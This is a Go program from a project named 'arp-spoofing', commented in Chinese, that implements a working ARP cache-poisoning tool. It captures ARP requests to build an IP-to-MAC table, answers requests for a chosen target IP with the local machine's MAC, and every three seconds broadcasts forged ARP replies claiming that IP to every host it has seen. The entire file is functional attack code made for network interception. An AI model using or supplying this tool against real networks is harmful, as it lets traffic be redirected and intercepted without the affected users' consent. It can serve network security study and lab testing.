package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"sync"
	"time"

	"arp-spoofing/internal/app"

	"github.com/mdlayher/arp"
)

// macTable 存储局域网中发现的 IP -> MAC 映射
var (
	mu       sync.Mutex
	macTable = make(map[string]string)
)

// captureARP 监听 ARP 请求并记录发送方到 macTable
func captureARP(ctx context.Context, client *arp.Client, point app.Endpoint) {
	for {
		packet, _, err := client.Read()
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
				fmt.Fprintf(os.Stderr, "read ARP packet: %v\n", err)
				continue
			}
		}
		if packet.Operation != arp.OperationRequest {
			continue
		}

		// 记录发送方到 macTable
		mu.Lock()
		macTable[packet.SenderIP.String()] = packet.SenderHardwareAddr.String()
		mu.Unlock()

		// 命中的目标立即回复
		if packet.TargetIP == point.IP {
			fmt.Printf("[>] Caught ARP request for %s from %s / %s\n",
				point.IP, packet.SenderIP, packet.SenderHardwareAddr)
			if err := client.Reply(packet, point.MAC, point.IP); err != nil {
				fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
				continue
			}
			fmt.Printf("[+] Sent ARP reply: %s is at %s\n",
				point.IP, point.MAC)
		}
	}
}

func run(ifname, spoofedIPStr string) error {
	iface, myIP, err := app.GetInterface(ifname)
	if err != nil {
		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
	}

	spoofedIP, err := app.ParseIPv4(spoofedIPStr)
	if err != nil {
		return err
	}

	client, err := arp.Dial(iface)
	if err != nil {
		return fmt.Errorf("arp dial %s: %w\nHint: run as root or with CAP_NET_RAW", ifname, err)
	}
	defer client.Close()

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	fmt.Printf("[*] Local MAC: %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Local IP : %s\n", myIP)
	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)

	// Producer: 后台捕获 ARP 包，记录到 macTable
	endpoint := app.Endpoint{IP: spoofedIP, MAC: iface.HardwareAddr}
	go captureARP(ctx, client, endpoint)

	// Consumer: 定时遍历 macTable，向所有已知主机发送 ARP Reply
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			mu.Lock()
			for ip, mac := range macTable {
				targetMAC, err := app.ParseMAC(mac)
				if err != nil {
					continue
				}
				targetIP, err := app.ParseIPv4(ip)
				if err != nil {
					continue
				}
				pkt, err := arp.NewPacket(
					arp.OperationReply,
					iface.HardwareAddr,
					spoofedIP,
					targetMAC,
					targetIP,
				)
				if err != nil {
					continue
				}
				if err := client.WriteTo(pkt, targetMAC); err != nil {
					fmt.Fprintf(os.Stderr, "send spoofed reply to %s: %v\n", ip, err)
				} else {
					fmt.Printf("[+] Spoofed reply: %s is at %s -> %s\n", spoofedIP, iface.HardwareAddr, ip)
				}
			}
			mu.Unlock()
		case <-ctx.Done():
			fmt.Println("\n[*] Exiting")
			// 打印最终的 macTable
			fmt.Println("[*] Final ARP table:")
			mu.Lock()
			for ip, mac := range macTable {
				fmt.Printf("    %s -> %s\n", ip, mac)
			}
			mu.Unlock()
			return nil
		}
	}
}

func main() {
	var ifname, spoofedIP string
	flag.StringVar(&ifname, "i", "", "network interface")
	flag.StringVar(&spoofedIP, "s", "", "spoofed IPv4 address")
	flag.Parse()

	if ifname == "" || spoofedIP == "" {
		flag.Usage()
		os.Exit(1)
	}

	if err := run(ifname, spoofedIP); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
